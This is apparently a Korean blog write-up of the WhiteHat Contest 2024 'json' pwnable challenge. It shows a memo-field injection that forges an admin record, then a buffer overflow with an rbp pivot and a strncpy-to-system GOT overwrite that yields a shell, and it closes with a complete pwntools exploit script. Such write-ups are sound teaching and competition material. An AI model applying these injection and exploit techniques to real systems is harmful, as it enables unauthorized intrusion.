+++
title = "WhiteHat Contest 2024 - json"
date = "2024-11-23"
description = "WhiteHat Contest 2024 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "injection", "rop"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/json'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

### Concept
`init()` 함수를 보면 실행 때마다 `/users/[random string]`라는 이름으로 `USER_FILE`을 생성해서 DB 파일로 사용한다.

최초에는 `user_base.bin` 파일을 읽어와 그대로 저장하며 내용은 다음과 같다.

- `[2|guest|guest|guest memo]`
  - `2` : type
  - 1st `guest` : user
  - 2nd `guest` : pass
  - `guest memo` : memo

이 DB 파일을 기반으로 `user`, `pass`가 일치하면 `token`을 발행해 세션을 생성하고, 그 정보를 `session` 전역변수에 저장한다.

### Structure
``` c
struct sess // sizeof=0x40
{
    char user[16];
    char pass[16];
    char *memo;
    __int64 type;
    char token[16];
};
```

발행된 세션에 대한 정보가 위와 같은 구조체 형식으로 저장된다.

### Goal
``` c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
    ...
        else if ( !strcmp((const char *)s, "UpdateMemo") && LOBYTE(session->type) == '1' )
        {
          update_memo();
        }
    ...
}

char *update_memo()
{
  char buf[16]; // [rsp+0h] [rbp-10h] BYREF

  read(0, buf, 0x100uLL);
  return strncpy((char *)session->memo, buf, 0x100uLL);
}
```

`type`이 `'1'`일 경우 `update_memo()`를 호출할 수 있고, 그 안에서 BOF가 발생한다.


## 0x01. Vulnerability
``` c
void __fastcall create_user(__int64 json)
{
  ...
  stream = fopen(USER_FILE, "ab");
  ...
  extract(json, "user", user, 16);
  extract(json, "pass", pass, 16);
  extract(json, "memo", memo, 256);
  if ( *(_BYTE *)user && *(_BYTE *)pass && *(_BYTE *)memo )
  {
    fwrite("[", 1uLL, 1uLL, stream);
    fwrite("2", 1uLL, 1uLL, stream);
    fwrite("|", 1uLL, 1uLL, stream);
    fwrite(user, 1uLL, 0x10uLL, stream);
    fwrite("|", 1uLL, 1uLL, stream);
    fwrite(pass, 1uLL, 0x10uLL, stream);
    fwrite("|", 1uLL, 1uLL, stream);
    fwrite(memo, 1uLL, 0x100uLL, stream);
    fwrite("]\n", 1uLL, 2uLL, stream);
  }
  ...
}
```

`create_user()`에서 `USER_FILE`에 사용자를 추가할 수 있는데 `type`이 `'2'`가 되게끔 하드코딩 되어있다.

하지만 `memo`에 대한 검증이 없어 다음과 같이 injection이 가능하다.

- `memo` : `AAAA]\n[1|admin|admin|admin memo`

``` text
[2|guest|guest|guest memo]
[2|AAAA|AAAA|AAAA]
[1|admin|admin|admin memo]
```

이후 `admin/admin`으로 `create_session()`을 호출하면 `type`이 `'1'`인 세션이 생성된다.


## 0x02. Exploit
이제 ROP만 수행하면 되겠다 싶었는데 애석하게도 인자를 설정할 가젯이 하나도 없었다.

``` bash
➜  ROPgadget --binary=json | grep rdi
0x0000000000401406 : or dword ptr [rdi + 0x405108], edi ; jmp rax
0x0000000000401c76 : ror byte ptr [rdi], 0x85 ; retf
```

처음에는 `update_memo()`의 `strncpy` 종료 시점의 레지스터를 이용하려고 했으나, `session->memo`의 끝 부분을 가리키고 있어 `/bin/sh` 등의 인자를 넣어주는 것이 불가능해보였다.

`system` PLT가 괜히 있는 것은 아닐거라고 생각해서 `update_memo()`를 assembly로 살펴보았다.
``` text
.text:0000000000402140  endbr64
.text:0000000000402144  push    rbp
.text:0000000000402145  mov     rbp, rsp
.text:0000000000402148  sub     rsp, 10h
.text:000000000040214C  lea     rax, [rbp+buf]
.text:0000000000402150  mov     edx, 100h       ; nbytes
.text:0000000000402155  mov     rsi, rax        ; buf
.text:0000000000402158  mov     edi, 0          ; fd
.text:000000000040215D  call    _read
.text:0000000000402162  mov     rax, cs:session
.text:0000000000402169  mov     rax, [rax+20h]
.text:000000000040216D  lea     rcx, [rbp+buf]
.text:0000000000402171  mov     edx, 100h       ; n
.text:0000000000402176  mov     rsi, rcx        ; src
.text:0000000000402179  mov     rdi, rax        ; dest
.text:000000000040217C  call    _strncpy
.text:0000000000402181  nop
.text:0000000000402182  leave
.text:0000000000402183  retn
```

`read`의 인자인 `rsi`가 `rbp`를 통해 설정되는데, BOF를 통해 `rbp`는 얼마든지 컨트롤 할 수 있으므로 AAW도 가능한 상황이다.

여기에서 GOT overwrite를 생각했고, `strncpy`의 `rdi`가 `session->memo`로 설정되는 것을 이용하여 미리 `/bin/sh`를 넣어두면 쉘 실행이 가능할 것으로 판단했다.

``` python
    read_strncpy_gadget = 0x40214C
    payload = b"/bin/sh\n" * 2
    payload += p64(elf.got['strncpy'] + 0x10)   # rbp
    payload += p64(read_strncpy_gadget)         # ret
    update_memo(s, token, payload)

    sleep(0.5)
    payload = p64(0x4010a0)                     # system
    s.send(payload)
```


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
from argparse import ArgumentParser

BINARY = "json"
LIBRARY = "libc.so.6"
CONTAINER = "f0268ff749ca"

code_base = 0x555555554000
bp = {
    'main' : code_base + 0x16ae,
}

gs = f'''
b *update_memo
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def create_session(s, user, pw):
    json = f"{{method:CreateSession,user:{user},pass:{pw}}}"
    s.send(json.encode())
    return s.recvuntil(b"}\n")

def clear_session(s):
    json = f"{{method:ClearSession}}"
    s.send(json.encode())
    return

def create_user(s, token, user, pw, memo):
    json = f"{{token:{token},method:CreateUser,user:{user},pass:{pw},memo:{memo}}}"
    s.send(json.encode())
    return

def check_user(s, token):
    json = f"{{token:{token},method:CheckUser}}"
    s.send(json.encode())
    return s.recvuntil(b"}\n")

def update_memo(s, token, payload):
    json = f"{{token:{token},method:UpdateMemo}}"
    s.send(json.encode())
    pause()
    s.send(payload)
    return

def main(server, port, debug):
    if(port):
        s = remote(server, port)
        if debug:
            pid = os.popen(f"sudo docker top {CONTAINER} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
            gdb.attach(int(pid), gs, exe=BINARY)
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        if debug:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    token = create_session(s, "guest", "guest").split(b"token:")[1].split(b"}")[0].decode()
    log.info(f"guest token : {token}")

    create_user(s, token, "AAAA", "AAAA", "AAAA]\n[1|admin|admin|admin memo")

    clear_session(s)
    sleep(0.5)

    token = create_session(s, "admin", "admin").split(b"token:")[1].split(b"}")[0].decode()
    log.info(f"admin token : {token}")

    read_strncpy_gadget = 0x40214C
    payload = b"/bin/sh\n" * 2
    payload += p64(elf.got['strncpy'] + 0x10)   # rbp
    payload += p64(read_strncpy_gadget)         # ret
    update_memo(s, token, payload)

    sleep(0.5)
    payload = p64(0x4010a0)                     # system
    s.send(payload)

    s.interactive()

if __name__=='__main__':
    parser = ArgumentParser()
    parser.add_argument('-s', '--server', type=str, default="0.0.0.0")
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-d', '--debug', type=int, default=1)
    args = parser.parse_args()
    main(args.server, args.port, args.debug)
```